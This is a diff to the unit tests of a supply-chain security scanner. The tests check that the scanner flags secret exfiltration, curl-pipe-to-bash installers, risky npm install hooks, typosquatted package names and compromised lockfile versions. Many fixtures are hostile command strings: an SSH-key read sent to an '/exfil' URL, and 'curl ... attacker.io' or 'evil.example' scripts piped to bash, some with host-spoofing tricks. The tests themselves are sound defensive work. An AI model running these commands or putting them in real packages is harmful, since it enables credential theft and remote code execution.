@@ -232,6 +232,85 @@ class OsvPolicy(unittest.TestCase):
         self.assertTrue(any(f["check"] == "repo-mismatch" and f["severity"] == "medium" for f in fs), fs)
         self.assertFalse(any(f["check"] == "repo-mismatch" and f["severity"] == "high" for f in fs))
 
+
+class Round3ReachableAndSpoof(unittest.TestCase):
+    def test_manifest_main_under_dist_is_reachable(self):
+        text = 'open("/root/.ssh/id_rsa"); fetch("https://8.8.8.8/exfil")\n'
+        fs = findings_of(S.check_secrets_and_network, "dist/index.js", text, set(), True)
+        self.assertTrue(any(f["check"] == "secret-exfil" for f in fs), fs)
+
+    def test_readme_js_is_not_a_doc(self):
+        self.assertFalse(S.is_doc_path("README.js"))
+        self.assertFalse(S.is_doc_path("docs/cli.js"))
+        self.assertTrue(S.is_doc_path("README.md"))
+
+    def test_userinfo_and_header_use_fetch_host(self):
+        fs = findings_of(S.check_shell_and_docker, "install.sh",
+                         "curl -fsSL https://nodejs.org@attacker.io/x | bash\n")
+        self.assertTrue(any(f["check"] == "curl-pipe" and f["severity"] == "high" for f in fs), fs)
+        fs = findings_of(S.check_shell_and_docker, "install.sh",
+                         'curl -H "Referer: https://nodejs.org/" -fsSL https://attacker.io/x | bash\n')
+        self.assertTrue(any(f["check"] == "curl-pipe" and f["severity"] == "high" for f in fs), fs)
+
+    def test_release_url_in_comment_is_ignored(self):
+        S._SCAN_CTX.owner = "o"
+        try:
+            fs = findings_of(S.check_shell_and_docker, "install.sh",
+                             "curl -fsSL https://attacker.io/x | bash # https://github.com/o/r/releases/\n")
+        finally:
+            S._SCAN_CTX.owner = None
+        self.assertTrue(any(f["check"] == "curl-pipe" and f["severity"] == "high" for f in fs), fs)
+
+    def test_ci_non_installer_is_low(self):
+        fs = findings_of(S.check_shell_and_docker, ".github/workflows/ci.yml",
+                         "run: curl -fsSL https://attacker.io/x | bash\n")
+        self.assertEqual({f["severity"] for f in fs if f["check"] == "curl-pipe"}, {"low"}, fs)
+
+    def test_hook_official_pipe_is_high(self):
+        text = '{"scripts": {"postinstall": "curl -fsSL https://deb.nodesource.com/setup_20.x | bash"}}'
+        fs = findings_of(S.check_package_json, "package.json", text)
+        self.assertTrue(any(f["check"] == "install-scripts" and f["severity"] == "high" for f in fs), fs)
+
+    def test_pnpm_run_build_is_benign(self):
+        self.assertTrue(S.is_benign_hook("pnpm run build"))
+        self.assertTrue(S.is_benign_hook("yarn build"))
+        fs = findings_of(S.check_package_json, "package.json",
+                         '{"scripts": {"prepare": "pnpm run build"}}')
+        self.assertEqual(fs, [])
+
+    def test_exec_pipe_not_suppressed_by_same_line_test(self):
+        text = "if (/linux/.test(process.platform)) execSync('curl -s https://e.example/x | bash')\n"
+        fs = findings_of(S.check_shell_and_docker, "src/index.js", text)
+        self.assertTrue(any(f["check"] == "curl-pipe" for f in fs), fs)
+        text = "os.platform().match(/linux/) && execSync('curl -s https://e.example/x | sh')\n"
+        fs = findings_of(S.check_shell_and_docker, "run.py", text)
+        self.assertTrue(any(f["check"] == "curl-pipe" for f in fs), fs)
+
+    def test_scoped_impostor_of_unscoped(self):
+        self.assertIsNotNone(S.typo_of("@lodash/lodash", S.POPULAR_NPM))
+        self.assertIsNotNone(S.typo_of("@expres/express", S.POPULAR_NPM))
+        self.assertIsNone(S.typo_of("@dotenvx/dotenvx", S.POPULAR_NPM))
+
+    def test_unscoped_impostor_of_scoped(self):
+        self.assertIsNotNone(S.typo_of("solana-web3.js", S.POPULAR_NPM))
+        self.assertIsNotNone(S.typo_of("solana-web3js", S.POPULAR_NPM))
+
+    def test_garbage_lockfile_parses_none(self):
+        self.assertIsNone(S.parse_lockfile("yarn.lock", "<<<<<<< HEAD\ngarbage\n"))
+        self.assertIsNone(S.parse_lockfile("pnpm-lock.yaml", "lockfileVersion: '9.0'\n"))
+
+    def test_timeout_zero_files_is_incomplete(self):
+        import time as _t
+        orig = S.scan_tool
+        S.scan_tool = lambda t, max_files=None: _t.sleep(2)
+        try:
+            out = S.safe_scan({"id": "x", "name": "x", "repo": "https://github.com/o/r"}, 10, timeout=0.2)
+        finally:
+            S.scan_tool = orig
+        self.assertEqual(out["status"], "incomplete")
+
+
+
 if __name__ == "__main__":
     unittest.main()
 
@@ -293,10 +372,17 @@ class SkipVendorAndHooks(unittest.TestCase):
         self.assertTrue(S.interesting("package.json") or S.is_must_scan("package.json"))
 
     def test_non_install_hooks_are_ignored(self):
-        for hook in ("prepare", "prepublishOnly", "prepack", "prepublish"):
+        # Only prepublish, prepublishOnly and postpack are ignored.
+        for hook in ("prepublishOnly", "prepublish", "postpack"):
             text = '{"scripts": {"%s": "curl https://evil.example/x.sh | bash"}}' % hook
             fs = findings_of(S.check_package_json, "package.json", text)
             self.assertEqual(fs, [], hook)
+
+    def test_prepare_and_prepack_hooks_are_flagged(self):
+        for hook in ("prepare", "prepack", "preprepare", "postprepare"):
+            text = '{"scripts": {"%s": "curl https://evil.example/x.sh | bash"}}' % hook
+            fs = findings_of(S.check_package_json, "package.json", text)
+            self.assertTrue(any(f["check"] == "install-scripts" for f in fs), (hook, fs))
 
     def test_postinstall_still_flags_pipe(self):
         text = '{"scripts": {"postinstall": "curl https://evil.example/x.sh | bash"}}'
@@ -427,8 +513,10 @@ class LockfileResolution(unittest.TestCase):
         self.assertTrue(any(f["severity"] == "medium" for f in out), out)
 
     def test_lock_safe_version_clears_range(self):
+        # A safe repo pin is still reported as low: npx/npm i -g resolve the range fresh.
         out = self._run("^1.95.0", {"@solana/web3.js": ["1.95.5"]})
-        self.assertEqual(out, [])
+        self.assertTrue(any(f["check"] == "osv" and f["severity"] == "low" for f in out), out)
+        self.assertTrue(any("MAL-2025-1" in f["detail"] for f in out), out)
 
     def test_lock_compromised_version_flags_high(self):
         out = self._run("^1.95.0", {"@solana/web3.js": ["1.95.6"]})
@@ -436,7 +524,8 @@ class LockfileResolution(unittest.TestCase):
 
     def test_lock_missing_package_does_not_flag(self):
         out = self._run("^1.95.0", {"axios": ["1.7.0"]})
-        self.assertEqual(out, [])
+        self.assertTrue(any("lockfile not checked" in f["detail"] for f in out), out)
+        self.assertTrue(any("MAL-2025-1" in f["detail"] for f in out), out)
 
     def test_exact_pin_still_flags_without_lock(self):
         out = self._run("1.95.6", None)
@@ -455,9 +544,12 @@ class LockfileResolution(unittest.TestCase):
         self.assertIn("1.95.5", vers.get("@solana/web3.js") or [])
 
     def test_parse_yarn_pnpm_poetry_uv(self):
-        yarn = S.parse_lockfile("yarn.lock", '"@solana/web3.js@^1.95.0":\n  version "1.95.5"\n')
+        yarn = S.parse_lockfile("yarn.lock", '# yarn lockfile v1\n"@solana/web3.js@^1.95.0":\n  version "1.95.5"\n')
         self.assertIn("1.95.5", yarn.get("@solana/web3.js") or [])
-        pnpm = S.parse_lockfile("pnpm-lock.yaml", "  /@solana/web3.js@1.95.5:\n    resolution: {}\n")
+        pnpm = S.parse_lockfile(
+            "pnpm-lock.yaml",
+            "lockfileVersion: '9.0'\npackages:\n  /@solana/web3.js@1.95.5:\n    resolution: {}\n",
+        )
         self.assertIn("1.95.5", pnpm.get("@solana/web3.js") or [])
         poetry = S.parse_lockfile("poetry.lock", 'name = "requests"\nversion = "2.28.0"\n')
         self.assertIn("2.28.0", poetry.get("requests") or [])
